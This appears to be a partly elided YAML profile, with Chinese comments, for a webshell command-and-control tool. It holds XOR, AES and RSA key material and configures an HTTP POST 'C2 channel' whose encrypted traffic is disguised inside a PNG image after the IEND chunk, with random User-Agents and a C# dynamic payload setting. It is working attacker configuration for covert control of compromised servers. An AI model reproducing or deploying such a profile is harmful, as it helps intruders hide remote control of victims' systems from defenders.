...
#静态变量
staticVars:
  xorKey: !!binary '\xed\x1b\x18\xcf\x94\x1e\x88[\x9bH\x98\xd9\x18\xf3\xad\x13'
  aes256Key: !!binary ' \x10YK\xc8^=\x86\x9b\x5c\xea\x93\x08\xdb\x8d\xc9\x197V\x16#3!\x17\xda\xccE\xa7\xca\xdev\x83'
  RSA_PUBLIC_KEY: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNWrBpUhRwOS+/54Q6HgMLoqJ2TCMhNo+0j6AzlbClACuvGmEAxBDuLFdcK0dOLFbek4wnufgBb9ZI/3IThElQYOp1jlHahzNbq0LVIVhBA3ZEMtyLopQigZzPSgb6UywvyWwzfU6wienTCs/ExOvIqa9Ihpzl+fWf7f+wzYQROwIDAQAB
  RSA_PRIVATE_KEY: 
  aes128Key: !!binary '\x80\x1d\x90\x87\x05\x92\x0cr\x17\xd9D\xfb\xac\x98\xe5\x84'
  aes256IV: !!binary 'ni^\xbe\xa8*\xcb\xd5\xc7[y\x0c\xdf\x0a\xe9\x90'
#基础配置
basicConfig:
...
responseDecryptionChain: base64->pdfstream
#Request配置
request:
  ...
  #requestCheck: GetParameter->loginName == admin
  #Request 查询字符串 支持C2信道
  requestQueryString: ''
  #Request Method
  requestMethod: POST
  #是否开启随机User-Agent
  enabledRandomUserAgent: true
  ...
  #请求c2通道开头追加数据 (完整合法 1x1 PNG, 密文附尾)
  requestChannelStartAppend: !!binary ''
  #请求c2通道结尾追加数据
...
response:
  ...
  #响应体开头追加数据 (PNG signature+IHDR+IDAT 57B)
  responseBodyStartAppend: !!binary ''
  #响应中间数据 仅支持C2信道 (如填写其它值不会输出)
  responseBody: !!binary '@@@CHANNEL'
  #响应体结尾追加数据
  responseBodyEndAppend: !!binary ''
  #响应c2通道开头追加数据 (IEND chunk 12B 做提取标记, 密文在其后)
  responseChannelStartAppend: !!binary ''
  #响应c2通道结尾追加数据
  responseChannelEndAppend: !!binary ''
#Payload配置
payloadConfigs:
  CSharpDynamicPayload: {
    }
